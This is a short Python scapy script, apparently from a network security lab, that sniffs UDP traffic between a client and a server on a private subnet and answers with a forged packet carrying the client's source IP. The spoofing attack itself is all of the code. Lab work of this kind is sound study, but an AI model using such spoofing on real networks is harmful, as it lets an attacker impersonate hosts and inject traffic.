#!/usr/bin/python3
from scapy.all import *
# Client IP : 10.0.2.15
# Server IP : 10.0.2.5
# Attacker IP : 10.0.2.6
def spoof(pkt):
  # Construct packet data
  ip=IP(src="10.0.2.15",dst="10.0.2.5")		

  udp= UDP(sport=8888, dport=9090)		
  data="Hello World\n"				

  pkt=ip/udp/data			
  pkt.show()
  send(pkt,verbose=0)
  quit()


# Sniff UDP packet with desired source,destination and port
myFilter = 'udp and src host 10.0.2.15 and dst host 10.0.2.5 and dst port 9090'
sniff(filter = myFilter, prn=spoof)